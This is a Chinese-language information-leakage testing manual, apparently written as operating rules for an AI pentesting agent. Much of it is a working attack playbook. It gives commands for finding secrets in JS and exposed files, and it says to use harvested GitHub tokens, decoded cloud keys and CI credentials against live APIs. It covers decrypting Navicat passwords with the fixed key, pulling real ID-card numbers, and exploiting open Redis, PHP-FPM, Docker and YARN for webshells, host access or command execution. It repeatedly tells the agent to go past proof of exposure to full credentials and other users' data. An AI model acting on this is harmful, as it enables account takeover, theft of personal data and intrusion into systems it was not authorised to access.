> 写不写只认 `~/.grok/rules/vuln-report-format.md`。本篇测：版本/框架/health/无账密壳/指纹 → 继续挖完整账密、密钥、跨主体业务数据。抄到账密/云密钥/token：须假值对照，认钥枪带出身份或列表，再打不影响线上的只读例才交；手机号加解密钥不写。
> 结构：本篇较短，可整篇开。中间件端口见了再打（§五），不是每站先扫端口。

# 信息泄露测试手册

## 一、常见泄露点

### 1.1 接口响应字段过多

```bash
# 测试登录/用户信息接口是否返回敏感字段
curl "https://target.com/api/user/info" \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool

# 关注字段:
# password, passwordHash, salt
# idCard, bankCard, realName
# phone (未脱敏), email
# secretKey, apiKey, token
# internal fields: is_admin, role, balance_internal
```

### 1.2 错误信息泄露

```bash
# 发送畸形请求触发错误
curl "https://target.com/api/user?id='"
curl "https://target.com/api/user?id[]=1"

# 关注响应中:
# 数据库报错（SQL语句暴露）
# Stack trace（代码路径暴露）
# 内网 IP 地址
# 框架/版本信息
```

---

## 二、文件/目录泄露

### 2.1 常见敏感路径

```bash
# 开发遗留文件
/.git/config
/.git/HEAD
/.svn/entries
/.DS_Store
/.env
/.env.local
/.env.production
/config.php
/config.yml
/application.properties
/application.yml
/web.config

# 备份文件
/index.php.bak
/index.php~
/backup.zip
/backup.tar.gz
/www.zip
/site.tar.gz
/db.sql
/database.sql

# API 文档（可能泄露接口列表）
/swagger-ui.html
/api-docs
/v2/api-docs
/swagger.json
/openapi.json
/doc.html
/redoc

# 监控/运维端点
/actuator
/actuator/env
/actuator/mappings
/actuator/beans
/metrics
/health
/info
```

### 2.2 自动扫描

```bash
# ffuf 批量检测
ffuf -u "https://target.com/FUZZ" \
  -w sensitive_paths.txt \
  -mc 200,301,302,403 \
  -t 30 -o leaks.json -of json

# 从 ffuf 结果过滤 403（可能有内容但被拦截，值得深入）
cat leaks.json | python3 -c "
import json, sys
data = json.load(sys.stdin)
for r in data['results']:
    print(f\"{r['status']} {r['url']} ({r['length']} bytes)\")
"
```

---

## 三、JS 文件信息泄露

```bash
# 从 JS 文件中提取敏感信息
# 下载所有 JS 后搜索:
grep -rE "(apiKey|api_key|secret|password|token|ak|sk)\s*[=:]\s*['\"][^'\"]{8,}" *.js

# AK/SK 泄露（云服务凭证）
grep -E "AKID[A-Za-z0-9]{16,}" *.js       # 云厂商 AK 前缀
grep -E "LTAI[A-Za-z0-9]{16,}" *.js       # 云厂商 AK 前缀
grep -E "AKIA[A-Za-z0-9]{16,}" *.js       # AWS
grep -E "[a-zA-Z0-9+/]{40}=" *.js         # 疑似 Base64 密钥

# GitHub PAT（文档/社区站常把贡献者插件的钥打进 bundle）
grep -oE "ghp_[A-Za-z0-9]{20,}" *.js
grep -oE "github_pat_[A-Za-z0-9_]{20,}" *.js

```

### 3.1 文档站 GitHub PAT

开源文档/社区前端为拉 GitHub org、贡献者、star 把头，常把 `ghp_` / `github_pat_` 打进打包 JS。

不登录从 JS 抄出来：

```bash
curl -s "https://api.github.com/user" -H "Authorization: token $PAT"
# 对照：不带头应 401
curl -s "https://api.github.com/user/repos?affiliation=owner&per_page=5" -H "Authorization: token $PAT"
```

算成：me 是真人 login/姓名，且对该号仓 `permissions.admin=true`（能当这个 GitHub 号用）。官方 org 仓只有 pull 也要把个人仓 admin 写进危害。

假点：钥已吊销；`/user` 401；只是 GitHub App 安装令牌读公开 org。密钥实值只进正式报告，不进本篇。

### viewer JS XOR 藏对象存储永久钥（短表有指针）

认：落地页/viewer JS 有 `usePrivateCode`（或同类函数名），`COS_TOKEN` 的 SECRET_ID/SECRET_KEY 不是明文 AKID。编码：前 16 个字符当循环 XOR 钥匙，后面一段 hex 解开才是永久 AK/SK。只 grep `AKID` 会当没钥。

打（不登录）：解开后签 `云 STS 接口` **GetCallerIdentity**，再 `云 CAM 接口` **GetUserAppId**。ListBuckets 403 别停。

算成：问出 AccountId/Uin/AppId。长期钥，不是几分钟过期的临时票。

假点：解开调云 API AuthFailure；`exampleValue` 解成 `hello_world` 占位。密钥实值只进正式报告，不进本篇。单站没中不删短表这行。

### 管理台 JS 写死 CI 仓钥（短表有指针）

认：管理台前端 JS 写死 CI 的 `pipelineId` + base64 `auth`，且有未登录 trigger 口。

打（不登录）：抄 auth 调 `Git 托管开放接口` open-api `DescribeMyDepots`；本站 trigger 只作对照。

算成：列出他团队私有仓库名/HttpsUrl/ProjectId，或钥 scope 含 `depot_read` 且开放接口认钥。

假点：钥过期；仓是公开的；只有 trigger 回产品下线、没有证明钥还能列出私仓。密钥实值只进正式报告，不进本篇。单站没中不删短表这行。

### 文档 chunk 里的真实证件样例（短表有指针）

认：开放平台文档中心；页面文档/分类口 401；入口 script 有 DocPage 动态 `import()` 的 `technical-document`（或同类文档 chunk）。不是「调试文档写死 AppSecret」那一行。

打（不登录）：文档 API 401 别停。跟首页 script → DocPage `import()` → 文档 chunk。抠样例请求/响应报文里的身份证、手机、姓名。过校验位才往下。

算成：过校验位的身份证 + 姓名/手机，对得上人。

假点：张三/110101 占位；校验位不对的编造号；空 `appliIdNo` 模板；只有公开产品说明书没有样例报文。单站没中不删短表这行。证件实值只进正式报告。

### 匿名领签包里的连接配置（短表有指针）

认：企业软件中心人打开是登录页；另有领对象存储带签口不要 Cookie；或同站 `/download/`+软件文件名不要 Cookie；压缩包里是 Navicat `ncx`（连接名、Host、账号、`SavePassword` 密文）。首页 302 去登录墙时，**302 响应体里内联的领签函数也算入口**，别只看落地登录页。

打（不登录）：领签口把带签 URL 拿出来，Range GET 真 zip。**领签没有/要登录别停**：302 体或首页软件列表里的文件名，同站 `GET /download/{文件名}` 直下（乱填文件名常 302 回首页，对上名字才 200）。解出 `*.ncx`。Password 用 Navicat 12 固定钥匙 `libcckeylibcckey`、IV `libcciv libcciv` 做 AES-128-CBC，去掉 PKCS7。

算成：内网库 Host+账号+明文密。密钥实值只进正式报告。

假点：包里只有公开客户端没有连接配置；密文解不开。单站没中不删短表这行。

### 分布式文件 master 未授权用户钥（短表有指针）

认：公网 HTTP `/version` 出 `"Model":"master"`（分布式文件集群）。管理口不要登录。

打（不登录）：

1. `GET /user/list` 拿 `access_key`+`secret_key`
2. 对照：假 16 位 ak 打 `GET /user/akInfo?ak=` 应 `access key not exists`；真 ak 问出 `user_id`/user_type
3. `GET /admin/getVol?name=` 看他用户业务卷（Owner / InodeCount）

算成：完整 AK/SK 且真钥问出身份/他用户业务卷。

假点：只出版本/集群名没有钥；list 空；真假钥同一句；只有自己的空测试卷。密钥实值只进正式报告，不进本篇。单站没中不删短表这行。

```bash
# 内网地址泄露
grep -oE "192\.168\.[0-9]{1,3}\.[0-9]{1,3}" *.js
grep -oE "10\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" *.js
grep -oE "172\.(1[6-9]|2[0-9]|3[01])\.[0-9]{1,3}\.[0-9]{1,3}" *.js
```

---

## 四、特殊接口泄露

### 4.1 分页接口越界

```bash
# 大页码获取全量数据
?page=99999&pageSize=1000
?offset=0&limit=99999

# 导出接口未限制数量
/api/export/users?format=csv
/api/export/orders?startTime=2020-01-01&endTime=2026-01-01
```

### 4.2 搜索接口通配符

```bash
# 模糊搜索获取全量数据
?keyword=%         # URL 编码的 %，SQL LIKE 通配符
?keyword=*
?keyword=.         # 部分系统
?q=               # 空搜索返回所有
```

### 4.3 GraphQL 自省

```bash
# GraphQL 接口泄露 schema
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name fields { name } } } }"}'

# 如果返回完整 schema → 可能泄露未公开的接口和字段
```

---

## 五、中间件端口见了怎么打

> **见了才打。** 不是每站先 nmap 全端口。FOFA/进站/响应头已经露出这些端口或控制台，再按表走。打穿了按 `vuln-report-format` 落盘；health/版本壳继续跟账密，不要停在 PONG。

| 见什么 | 打哪 | 出什么算成 | 假点 / 转哪 |
|--------|------|------------|-------------|
| `:6379` Redis，无密码 `PING`→`PONG` | 写 webshell / crontab / `authorized_keys`（目录得是真 web 根或 cron）。SSRF 走到这口用 `gopher://`，见 `ssrf-test.md` | 命令跑起来，或读到业务库 | 有 `requirepass`；`CONFIG` 被 rename；只能 `PING` |
| `:873` rsync 匿名 `rsync host::` 列出模块 | 下业务文件；模块可写再看能否写 cron | 拉到密钥/业务数据 | 空模块；只读且全是公开静态 |
| `:9000` PHP-FPM/FastCGI 直接暴露 | FastCGI 包打已有 `.php`（`PHP_VALUE=auto_prepend_file=php://input`）。SSRF 用 gopherus fastcgi | 指定 PHP 被执行 | 只 Unix socket、外网 9000 不是 FPM |
| `:8009` AJP | Ghostcat 读 `/WEB-INF/web.xml`。见 `path-traversal-lfi-test.md` §21 | 读到 web.xml / class | `secretRequired`；端口不是 AJP |
| `:8088` Hadoop YARN UI | `POST /ws/v1/cluster/apps/new-application` 再提交带 `commands` 的 app | 集群里跑了你的命令 | 只要 UI 登录墙；提交 401 |
| `:2375` Docker API | `GET /v1.24/containers/json`；能 create 再挂 `/:/host` | 列出容器或读到宿主机文件 | TLS 2376 无客户端证；只 version |
| `/h2-console` | JDBC URL JNDI 或 `CREATE ALIAS`。见 `jndi-injection-test.md`「H2 Console」 | 命令跑起来 | 只本机能开 |

公网直接打和 SSRF 打内网是同一套 sink，差别只是入口。没这些端口不要为了本表去扫。
